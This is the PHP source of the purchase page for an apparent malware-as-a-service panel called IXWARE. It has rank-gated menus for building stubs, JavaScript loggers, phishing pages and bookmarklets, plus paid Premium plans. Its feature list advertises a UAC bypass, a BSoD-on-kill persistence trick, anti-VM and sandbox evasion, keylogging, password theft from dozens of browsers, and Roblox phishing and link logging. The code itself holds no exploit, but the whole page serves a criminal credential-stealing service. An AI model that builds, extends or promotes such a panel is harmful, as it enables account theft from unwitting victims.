  <?php 
      @session_start();
      $title = 'Purchase';
      include_once 'includes/layout/header.php';
      include_once 'includes/checks.php';
       
      $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn(0);
      
      if($banned != 0){
          
          header("location: support");
          exit();
      }
      if(checkMaintenance() == 'Maintenance' && $getRank != "Admin"){
        header('Location: dashboard');
        die();
      }
       
      if(isset($_SESSION['username'])){
        $username = htmlspecialchars($_SESSION['username']);
      }else{
        $username = "Unknown";
      }
  ?>
  <body class="bg-dark">
  <!--Main Navigation-->
  <header>
    <!-- Sidenav -->
    <nav id="sidenav-1" class="sidenav bg-dark" data-hidden="false" data-accordion="true">
      <a class="ripple d-flex justify-content-center py-4" href="#!" data-ripple-color="primary">
        <img id="IXWARE Logo" src="resources/img/ixwarelogogif.gif" alt="IX Logo" draggable="false" class="same-size-logo" />
      </a>

      <ul class="sidenav-menu">
        <li class="sidenav-item ml-4 mt-2 mb-1 text-white">
          <span>General</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="dashboard">
            <i class="fas fa-tachometer-slow fa-fw mr-3"></i><span>Dashboard</span>
          </a>
        </li>
        <?php
          if ($getRank == "User" || $getRank == "Admin"){
            echo "<li class='sidenav-item'>
            <a class='sidenav-link active' href='purchase'>
              <i class='fas fa-shopping-basket fa-fw mr-3'></i><span>Purchase</span>
            </a>
          </li>";
          }
        ?>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Managing</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-users fa-fw mr-3"></i><span>Bots</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){

                echo "<li class='sidenav-item'>
                 <a class='sidenav-link' href='bots'>Stubs <span class='badge bg-danger ml-2' id='bot-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBots'>Phishing <span class='badge bg-danger ml-2' id='ps-logs'>0</span></a>
                </li>";
              }elseif($getRank == "User"){

                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-shield-virus fa-fw mr-3"></i><span>Builder</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builder'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilder'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilder'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-file-download fa-fw mr-3"></i><span>Builds</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builds'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilds'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilds'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-tools fa-fw mr-3"></i><span>Tools</span>
          </a>
          <ul class="sidenav-collapse">
            <li class='sidenav-item'>
              <a class='sidenav-link' href='watchlist'>Watchlist</a>
            </li>
          </ul>
        </li>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Account</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-sliders-h fa-fw mr-3"></i><span>Settings</span>
          </a>
          <ul class="sidenav-collapse">
            <li class="sidenav-item">
              <a class="sidenav-link" href="settings">General</a>
            </li>
            <li class="sidenav-item">
              <a class="sidenav-link" href="builder-settings">Builder</a>
             </li>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="ix-licenses">
            <i class="fab fa-keycdn fa-fw mr-3"#></i><span>Licenses</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="support">
            <i class="fas fa-question-circle fa-fw mr-3"#></i><span>Support</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="logout">
            <i class="fal fa-sign-out fa-fw mr-3"></i><span>Logout</span>
          </a>
        </li>
      </ul>
    </nav>
    <!-- Sidenav -->

    <!-- Navbar -->
    <nav
      id="main-navbar"
      class="navbar navbar-expand-lg navbar-light fixed-top bg-dark"
    >
      <!-- Container wrapper -->
      <div class="container-fluid">
        <nav aria-label="breadcrumb">
          <ol class="breadcrumb">
            <li class="breadcrumb-item text-white">Dashboard</li>
          </ol>
        </nav>
        <!-- Toggler -->
        <button
          data-toggle="sidenav"
          data-target="#sidenav-1"
          class="btn shadow-0 p-0 mr-3 d-block d-xxl-none"
          aria-controls="#sidenav-1"
          aria-haspopup="true"
        >
          <i class="fas fa-bars fa-lg"></i>
        </button>

        <!-- Right links -->
        <ul class="navbar-nav ml-auto d-flex flex-row">

          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2 text-white">
              <?= $username ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2">
              <?php
                if ($getRank == "User"){
                  echo "<span class='badge bg-light text-dark'>Default</span>";
                }elseif ($getRank == "Admin"){
                  echo "<span class='badge bg-danger'>Administrator</span>";
                }elseif ($getRank == "Premium"){
                  echo "<span class='badge bg-warning text-dark'>Premium</span>";
                }
              ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0">
<?php
		            $getAvatar = pdoQuery($db, "SELECT `avatarURL` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
                $av = htmlspecialchars($getAvatar);
                if ($av == '0' || empty($av)){
                  echo "<img src='resources/img/logo.png' class='img-fluid rounded-circle profile-size' alt='' />";
                }else{
                  echo "<img src='$av' class='img-fluid rounded-circle profile-size' alt='' />";
                }
              ?>
            </a>
          </li>
        </ul>
      </div>
      <!-- Container wrapper -->
    </nav>
    <!-- Navbar -->
  </header>
  <!--Main Navigation-->

  <!--Main layout-->
  <main style="margin-top: 100px" class="d-flex ml-5 mr-5">
    <div class="container-fluid">
    <div class="row">
            <div class="col-xl-8">
                <div class="card bg-dark table" style="display: table;">
                    <div class="card-body d-flex flex-column">
                      <div class="table-responsive">
                            <table class="table table-hover text-darkwhite">
                                <thead>
                                <tr>
                                    <th scope="col">Type</th>
                                    <th scope="col">Duration</th>
                                    <th scope="col">Price</th>
                                    <th scope="col">Options</th>
                                </tr>
                                </thead>
                                <tbody>
                                <tr>
                                    <th scope="row"><span class="badge bg-warning text-dark">Premium</span></th>
                                    <td>Monthly</td>
                                    <td>10 Euros</td>
                                    <td><button type="button" data-sellix-product="5edbc897dafaf" alt="Buy Now with Sellix.io" class="btn btn-sm btn-outline-success" data-ripple-color="dark"><i class="fas fa-cart-plus"></i> Buy Now</button></td>
                                </tr>
                                <tr>
                                    <th scope="row"><span class="badge bg-warning text-dark">Premium</span></th>
                                    <td>3 Months</td>
                                    <td>25 Euros</td>
                                    <td><button type="button" data-sellix-product="5edbc8edd0792" alt="Buy Now with Sellix.io" class="btn btn-sm btn-outline-success" data-ripple-color="dark"><i class="fas fa-cart-plus"></i> Buy Now</button></td>
                                </tr>
                                </tbody>
                            </table>
                        </div>
                        <p class="text-left mt-2 p-margin text-darkwhite">Already have a license? Activate it<a href="ix-licenses">here</a></p>
                        <p class="text-left mt-2 text-darkwhite">Looking to buy with PayPal? Join our<a href="<?php echo htmlspecialchars(discordserver()) ?>">discord</a></p>
                    </div>
                </div>
            </div>
            <div class="col-xl-4">
                <div class="card bg-dark table" style="display: table;">
                    <div class="card-body d-flex flex-column">
                    <p class="font-weight-bolder text-white">Features</p>
                            <ul class="text-muted">
                                <li class="text-darkwhite">Core Features</li>
                                <!-- Core-->
                                <li class="text-darkwhite">Webpanel Interface</li>
                                <li class="text-darkwhite">Webpanel Manager</li>
                                <li class="text-darkwhite">Webpanel Builder</li>
                                <li class="text-darkwhite">Webpanel Delivery</li>
                                <li class="text-darkwhite">Stable & Reliable</li>
                                <li class="text-darkwhite">Clean Log Interface</li>
                                <li class="text-darkwhite">Mutex (Single Instance Application)</li>
                                <li class="text-darkwhite">UAC Bypass (Windows 7, 8.1 & 10)</li>
                                <li class="text-darkwhite">Critical System-Process (BSoD when killed)</li>
                                <li class="text-darkwhite">Melt File</li>
                                <li class="text-darkwhite">Anti Debug/Anti VM/Sandbox</li>
                                <li class="text-darkwhite">Process Blocker</li>
                                <li class="text-darkwhite">Website Blocker</li>
                                <li class="text-darkwhite">Screenshot Logger</li>
                                <li class="text-darkwhite">Custom Icon</li>
                                <li class="text-darkwhite">Custom Build (Stub Name)</li>
                                <li class="text-darkwhite">Custom Assembly Informations</li>
                                <li class="text-darkwhite">Protected Stub</li>
                                <li class="text-darkwhite">Roblox Javascript Link Logger</li>
                                <li class="text-darkwhite mb-1">Robloblox Phishing Websites</li>
                                <li class="text-darkwhite ml-3">Advanced Keylogger</li>
                                <!-- Keylogger-->
                                <li class="text-darkwhite">Clipboard Logging</li>
                                <li class="text-darkwhite mb-1">Window Logging</li>
                                <li class="text-darkwhite ml-3">Browser Password Recoveries</li>
                                <!-- Browser Recoveries-->
                                <li class="text-darkwhite">Google Chrome</li>
                                <li class="text-darkwhite">Opera</li>
                                <li class="text-darkwhite">Yandex</li>
                                <li class="text-darkwhite">360 Browser</li>
                                <li class="text-darkwhite">Comodo Dragon</li>
                                <li class="text-darkwhite">CoolNovo</li>
                                <li class="text-darkwhite">SRWare Iron</li>
                                <li class="text-darkwhite">Torch Browser</li>
                                <li class="text-darkwhite">Brave Browser</li>
                                <li class="text-darkwhite">Iridium Browser</li>
                                <li class="text-darkwhite">7Star</li>
                                <li class="text-darkwhite">Amigo</li>
                                <li class="text-darkwhite">CentBrowser</li>
                                <li class="text-darkwhite">Chedot</li>
                                <li class="text-darkwhite">CocCoc</li>
                                <li class="text-darkwhite">Elements Browser</li>
                                <li class="text-darkwhite">Epic Privacy Browser</li>
                                <li class="text-darkwhite">Kometa</li>
                                <li class="text-darkwhite">Orbitum</li>
                                <li class="text-darkwhite">Sputnik</li>
                                <li class="text-darkwhite">uCozMedia</li>
                                <li class="text-darkwhite">Vivaldi</li>
                                <li class="text-darkwhite">Sleipnir 6</li>
                                <li class="text-darkwhite">Citrio</li>
                                <li class="text-darkwhite">Coowon</li>
                                <li class="text-darkwhite">Liebao Browser</li>
                                <li class="text-darkwhite">QIP Surf</li>
                                <li class="text-darkwhite mb-1">Edge Chromium</li>
                                <li class="text-darkwhite ml-3"><b>More Coming Soon</b></li>
                                <!-- More-->
                            </ul>  
                    </div>
                </div>
            </div>
        </div>
    </div>
  </main>
  <!--Main layout-->

  <?php require_once 'includes/layout/footer.php'; require_once 'includes/realtime.php';?>